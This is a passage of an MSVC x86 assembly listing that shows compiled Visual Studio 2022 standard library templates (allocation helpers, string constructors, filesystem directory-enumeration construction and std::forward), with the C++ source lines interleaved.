	DB	08dH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	0aaH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	0feH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	023H
	DW	01b8H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	0beH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	038H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	0feH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	0faH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	047H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	061H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	04bH
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	0dH
	DB	060H
voltbl	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$00@std@@YAII@Z
_TEXT	SEGMENT
__Overflow_is_possible$ = -1				; size = 1
__Count$ = 8						; size = 4
??$_Get_size_of_n@$00@std@@YAII@Z PROC			; std::_Get_size_of_n<1>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  00004	c6 45 ff 00	 mov	 BYTE PTR __Overflow_is_possible$[ebp], 0

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 73   :         if (_Count > _Max_possible) {
; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00008	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]

; 79   : }

  0000b	8b e5		 mov	 esp, ebp
  0000d	5d		 pop	 ebp
  0000e	c3		 ret	 0
??$_Get_size_of_n@$00@std@@YAII@Z ENDP			; std::_Get_size_of_n<1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YAII@Z
_TEXT	SEGMENT
__Max_possible$1 = -8					; size = 4
__Overflow_is_possible$ = -1				; size = 1
__Count$ = 8						; size = 4
??$_Get_size_of_n@$01@std@@YAII@Z PROC			; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  00006	c6 45 ff 01	 mov	 BYTE PTR __Overflow_is_possible$[ebp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  0000a	c7 45 f8 ff ff
	ff 7f		 mov	 DWORD PTR __Max_possible$1[ebp], 2147483647 ; 7fffffffH

; 73   :         if (_Count > _Max_possible) {

  00011	81 7d 08 ff ff
	ff 7f		 cmp	 DWORD PTR __Count$[ebp], 2147483647 ; 7fffffffH
  00018	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  0001a	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  0001f	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  00022	d1 e0		 shl	 eax, 1
$LN1@Get_size_o:

; 79   : }

  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YAII@Z ENDP			; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z
_TEXT	SEGMENT
__Ptr$ = -12						; size = 4
__Block_size$ = -8					; size = 4
__Ptr_container$ = -4					; size = 4
__Bytes$ = 8						; size = 4
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00006	8b 45 08	 mov	 eax, DWORD PTR __Bytes$[ebp]
  00009	83 c0 23	 add	 eax, 35			; 00000023H
  0000c	89 45 f8	 mov	 DWORD PTR __Block_size$[ebp], eax

; 143  :     if (_Block_size <= _Bytes) {

  0000f	8b 4d f8	 mov	 ecx, DWORD PTR __Block_size$[ebp]
  00012	3b 4d 08	 cmp	 ecx, DWORD PTR __Bytes$[ebp]
  00015	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00017	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  0001c	8b 55 f8	 mov	 edx, DWORD PTR __Block_size$[ebp]
  0001f	52		 push	 edx
  00020	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
  00025	83 c4 04	 add	 esp, 4
  00028	89 45 fc	 mov	 DWORD PTR __Ptr_container$[ebp], eax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0002b	83 7d fc 00	 cmp	 DWORD PTR __Ptr_container$[ebp], 0
  0002f	74 02		 je	 SHORT $LN9@Allocate_m
  00031	eb 09		 jmp	 SHORT $LN6@Allocate_m
$LN9@Allocate_m:
  00033	e8 00 00 00 00	 call	 __invalid_parameter_noinfo_noreturn
  00038	33 c0		 xor	 eax, eax
  0003a	75 f7		 jne	 SHORT $LN9@Allocate_m
$LN6@Allocate_m:
  0003c	33 c9		 xor	 ecx, ecx
  0003e	75 eb		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00040	8b 55 fc	 mov	 edx, DWORD PTR __Ptr_container$[ebp]
  00043	83 c2 23	 add	 edx, 35			; 00000023H
  00046	83 e2 e0	 and	 edx, -32		; ffffffe0H
  00049	89 55 f4	 mov	 DWORD PTR __Ptr$[ebp], edx

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  0004c	b8 04 00 00 00	 mov	 eax, 4
  00051	6b c8 ff	 imul	 ecx, eax, -1
  00054	8b 55 f4	 mov	 edx, DWORD PTR __Ptr$[ebp]
  00057	8b 45 fc	 mov	 eax, DWORD PTR __Ptr_container$[ebp]
  0005a	89 04 0a	 mov	 DWORD PTR [edx+ecx], eax

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0005d	8b 45 f4	 mov	 eax, DWORD PTR __Ptr$[ebp]
$LN1@Allocate_m:

; 156  : }

  00060	8b e5		 mov	 esp, ebp
  00062	5d		 pop	 ebp
  00063	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YAXAAU_Dir_enum_impl@filesystem@0@$$QAU_Creator@120@ABW4directory_options@20@@Z
_TEXT	SEGMENT
$T1 = -12						; size = 4
tv81 = -8						; size = 4
tv83 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
_<_Args_1>$ = 16					; size = 4
??$_Construct_in_place@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YAXAAU_Dir_enum_impl@filesystem@0@$$QAU_Creator@120@ABW4directory_options@20@@Z PROC ; std::_Construct_in_place<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00006	8b 45 08	 mov	 eax, DWORD PTR __Obj$[ebp]
  00009	50		 push	 eax
  0000a	e8 00 00 00 00	 call	 ??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z ; std::addressof<std::filesystem::_Dir_enum_impl>
  0000f	83 c4 04	 add	 esp, 4
  00012	50		 push	 eax
  00013	6a 40		 push	 64			; 00000040H
  00015	e8 00 00 00 00	 call	 ??2@YAPAXIPAX@Z		; operator new
  0001a	83 c4 08	 add	 esp, 8
  0001d	89 45 f4	 mov	 DWORD PTR $T1[ebp], eax
  00020	8b 4d 10	 mov	 ecx, DWORD PTR _<_Args_1>$[ebp]
  00023	51		 push	 ecx
  00024	e8 00 00 00 00	 call	 ??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z ; std::forward<enum std::filesystem::directory_options const &>
  00029	83 c4 04	 add	 esp, 4
  0002c	8b 10		 mov	 edx, DWORD PTR [eax]
  0002e	89 55 fc	 mov	 DWORD PTR tv83[ebp], edx
  00031	8b 45 0c	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  00034	50		 push	 eax
  00035	e8 00 00 00 00	 call	 ??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>
  0003a	83 c4 04	 add	 esp, 4
  0003d	89 45 f8	 mov	 DWORD PTR tv81[ebp], eax
  00040	8b 4d fc	 mov	 ecx, DWORD PTR tv83[ebp]
  00043	51		 push	 ecx
  00044	8b 55 f8	 mov	 edx, DWORD PTR tv81[ebp]
  00047	52		 push	 edx
  00048	8b 4d f4	 mov	 ecx, DWORD PTR $T1[ebp]
  0004b	e8 00 00 00 00	 call	 ??0_Dir_enum_impl@filesystem@std@@QAE@$$QAU_Creator@012@W4directory_options@12@@Z ; std::filesystem::_Dir_enum_impl::_Dir_enum_impl

; 256  :     }
; 257  : }

  00050	8b e5		 mov	 esp, ebp
  00052	5d		 pop	 ebp
  00053	c3		 ret	 0
??$_Construct_in_place@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YAXAAU_Dir_enum_impl@filesystem@0@$$QAU_Creator@120@ABW4directory_options@20@@Z ENDP ; std::_Construct_in_place<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@_W@1@@Z
_TEXT	SEGMENT
__As_view$ = -28					; size = 8
tv84 = -20						; size = 4
tv86 = -16						; size = 4
tv70 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Right$ = 8						; size = 4
__Al$ = 12						; size = 4
??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@_W@1@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>, COMDAT
; _this$ = ecx

; 2939 :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8b 4d 0c	 mov	 ecx, DWORD PTR __Al$[ebp]
  00012	51		 push	 ecx
  00013	0f b6 55 ff	 movzx	 edx, BYTE PTR $T1[ebp]
  00017	52		 push	 edx
  00018	8b 4d f4	 mov	 ecx, DWORD PTR tv70[ebp]
  0001b	e8 00 00 00 00	 call	 ??$?0ABV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>

; 2940 :         const basic_string_view<_Elem, _Traits> _As_view = _Right;

  00020	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00023	8b 08		 mov	 ecx, DWORD PTR [eax]
  00025	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00028	89 4d e4	 mov	 DWORD PTR __As_view$[ebp], ecx
  0002b	89 55 e8	 mov	 DWORD PTR __As_view$[ebp+4], edx

; 2941 :         _Construct<_Construct_strategy::_From_ptr>(_As_view.data(), _Convert_size<size_type>(_As_view.size()));

  0002e	8d 4d e4	 lea	 ecx, DWORD PTR __As_view$[ebp]
  00031	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  00036	50		 push	 eax
  00037	e8 00 00 00 00	 call	 ??$_Convert_size@II@std@@YAII@Z ; std::_Convert_size<unsigned int,unsigned int>
  0003c	83 c4 04	 add	 esp, 4
  0003f	89 45 f0	 mov	 DWORD PTR tv86[ebp], eax
  00042	8d 4d e4	 lea	 ecx, DWORD PTR __As_view$[ebp]
  00045	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  0004a	89 45 ec	 mov	 DWORD PTR tv84[ebp], eax
  0004d	8b 45 f0	 mov	 eax, DWORD PTR tv86[ebp]
  00050	50		 push	 eax
  00051	8b 4d ec	 mov	 ecx, DWORD PTR tv84[ebp]
  00054	51		 push	 ecx
  00055	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00058	e8 00 00 00 00	 call	 ??$_Construct@$00PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>

; 2942 :     }

  0005d	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00060	8b e5		 mov	 esp, ebp
  00062	5d		 pop	 ebp
  00063	c2 08 00	 ret	 8
??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@_W@1@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z PROC ; std::forward<std::_Facet_base * &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ENDP ; std::forward<std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z
_TEXT	SEGMENT
__Bytes$ = 8						; size = 4
??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z PROC ; std::_Allocate<8,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00003	81 7d 08 00 10
	00 00		 cmp	 DWORD PTR __Bytes$[ebp], 4096 ; 00001000H
  0000a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0000c	8b 45 08	 mov	 eax, DWORD PTR __Bytes$[ebp]
  0000f	50		 push	 eax
  00010	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00015	83 c4 04	 add	 esp, 4
  00018	eb 16		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0001a	83 7d 08 00	 cmp	 DWORD PTR __Bytes$[ebp], 0
  0001e	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00020	8b 4d 08	 mov	 ecx, DWORD PTR __Bytes$[ebp]
  00023	51		 push	 ecx
  00024	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
  00029	83 c4 04	 add	 esp, 4
  0002c	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  0002e	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00030	5d		 pop	 ebp
  00031	c3		 ret	 0
??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ENDP ; std::_Allocate<8,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@U_Dir_enum_impl@filesystem@std@@@std@@YAXAAU_Dir_enum_impl@filesystem@0@@Z
_TEXT	SEGMENT
__Obj$ = 8						; size = 4
??$_Destroy_in_place@U_Dir_enum_impl@filesystem@std@@@std@@YAXAAU_Dir_enum_impl@filesystem@0@@Z PROC ; std::_Destroy_in_place<std::filesystem::_Dir_enum_impl>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();

  00003	6a 00		 push	 0
  00005	8b 4d 08	 mov	 ecx, DWORD PTR __Obj$[ebp]
  00008	e8 00 00 00 00	 call	 ??_G_Dir_enum_impl@filesystem@std@@QAEPAXI@Z

; 312  :     }
; 313  : }

  0000d	5d		 pop	 ebp
  0000e	c3		 ret	 0
??$_Destroy_in_place@U_Dir_enum_impl@filesystem@std@@@std@@YAXAAU_Dir_enum_impl@filesystem@0@@Z ENDP ; std::_Destroy_in_place<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@ABV?$allocator@D@std@@@std@@YAABV?$allocator@D@0@ABV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABV?$allocator@D@std@@@std@@YAABV?$allocator@D@0@ABV10@@Z PROC ; std::forward<std::allocator<char> const &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@ABV?$allocator@D@std@@@std@@YAABV?$allocator@D@0@ABV10@@Z ENDP ; std::forward<std::allocator<char> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@ABQAD@std@@YAABQADABQAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABQAD@std@@YAABQADABQAD@Z PROC		; std::forward<char * const &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@ABQAD@std@@YAABQADABQAD@Z ENDP		; std::forward<char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPADAAV?$allocator@D@0@AAI@Z
_TEXT	SEGMENT
__Al$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPADAAV?$allocator@D@0@AAI@Z PROC ; std::_Allocate_at_least_helper<std::allocator<char> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	8b 08		 mov	 ecx, DWORD PTR [eax]
  00008	51		 push	 ecx
  00009	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  0000c	e8 00 00 00 00	 call	 ?allocate@?$allocator@D@std@@QAEPADI@Z ; std::allocator<char>::allocate

; 2212 :     }
; 2213 : }

  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPADAAV?$allocator@D@0@AAI@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPA_WAAV?$allocator@_W@0@AAI@Z
_TEXT	SEGMENT
__Al$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPA_WAAV?$allocator@_W@0@AAI@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	8b 08		 mov	 ecx, DWORD PTR [eax]
  00008	51		 push	 ecx
  00009	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  0000c	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QAEPA_WI@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPA_WAAV?$allocator@_W@0@AAI@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Get_unwrapped_unverified@AAY04$$CBD@std@@YA?A_TAAY04$$CBD@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
??$_Get_unwrapped_unverified@AAY04$$CBD@std@@YA?A_TAAY04$$CBD@Z PROC ; std::_Get_unwrapped_unverified<char const (&)[5]>, COMDAT

; 1212 : _NODISCARD constexpr decltype(auto) _Get_unwrapped_unverified(_Iter&& _It) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1213 :     // unwrap an iterator not previously subjected to _Adl_verify_range
; 1214 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1215 :         return _It + 0;

  00003	8b 45 08	 mov	 eax, DWORD PTR __It$[ebp]

; 1216 :     } else if constexpr (_Unwrappable_for_unverified_v<_Iter>) {
; 1217 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1218 :     } else {
; 1219 :         return static_cast<_Iter&&>(_It);
; 1220 :     }
; 1221 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$_Get_unwrapped_unverified@AAY04$$CBD@std@@YA?A_TAAY04$$CBD@Z ENDP ; std::_Get_unwrapped_unverified<char const (&)[5]>
